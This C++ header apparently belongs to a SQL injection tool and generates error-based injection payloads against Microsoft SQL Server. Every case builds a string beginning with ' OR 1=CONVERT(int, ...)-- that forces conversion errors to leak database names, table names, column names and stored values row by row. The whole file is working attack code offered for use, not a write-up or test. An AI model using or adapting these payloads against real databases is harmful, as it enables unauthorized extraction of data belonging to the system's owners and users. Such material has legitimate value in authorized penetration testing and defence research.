#ifndef MICROSOFTSQL_ERROR_BASED
#define MICROSOFTSQL_ERROR_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct microsoftsql_error_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const std::string index_str = *config[ERROR_BASED_INDEX];
                int index = std::stoi(index_str);
                *config[ERROR_BASED_INDEX] = std::to_string(index + 1);

                switch (type)
                {
                case DATABASES:
                        return "' OR 1=CONVERT(int, ("
                               "SELECT TOP 1 '~' + name "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " name " +
                               "FROM master..sysdatabases " +

                               "ORDER BY (SELECT NULL) " +
                               "EXCEPT SELECT TOP " +
                               index_str + " name " +
                               "FROM master..sysdatabases " +
                               "ORDER BY (SELECT NULL)) AS sub))-- ";
                case TABLES:
                        return "' OR 1=CONVERT(int, ("
                               "SELECT TOP 1 '~' + TABLE_NAME "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " TABLE_NAME " +
                               "FROM " + *config[ERROR_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.TABLES " +

                               "ORDER BY (SELECT NULL) " +
                               "EXCEPT SELECT TOP " +
                               index_str + " TABLE_NAME " +
                               "FROM " + *config[ERROR_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.TABLES " +
                               "ORDER BY (SELECT NULL)) AS sub))-- ";
                case COLUMNS:
                        return "' OR 1=CONVERT(int, ("
                               "SELECT TOP 1 '~' + COLUMN_NAME "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " COLUMN_NAME " +
                               "FROM " + *config[ERROR_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.COLUMNS " +
                               "WHERE TABLE_NAME='" +
                               *config[ERROR_BASED_TABLE] + "' " +

                               "ORDER BY (SELECT NULL) " +
                               "EXCEPT SELECT TOP " +
                               index_str + " COLUMN_NAME " +
                               "FROM " + *config[ERROR_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.COLUMNS " +
                               "ORDER BY (SELECT NULL)) AS sub))-- ";
                case VALUES:
                        return "' OR 1=CONVERT(int, ("
                               "SELECT TOP 1 '~' + CAST(" +
                               *config[ERROR_BASED_COLUMN] +
                               " AS varchar(255)) " +
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " " +
                               *config[ERROR_BASED_COLUMN] + " " +
                               "FROM " + *config[ERROR_BASED_DATABASE] + ".." +
                               *config[ERROR_BASED_TABLE] + " " +

                               "ORDER BY (SELECT NULL) " +
                               "EXCEPT SELECT TOP " +
                               index_str + " " +
                               *config[ERROR_BASED_COLUMN] + " " +
                               "FROM " + *config[ERROR_BASED_DATABASE] + ".." +
                               *config[ERROR_BASED_TABLE] + " " +
                               "ORDER BY (SELECT NULL)) AS sub))-- ";
                default:
                        return std::string();
                }
        };
};
#endif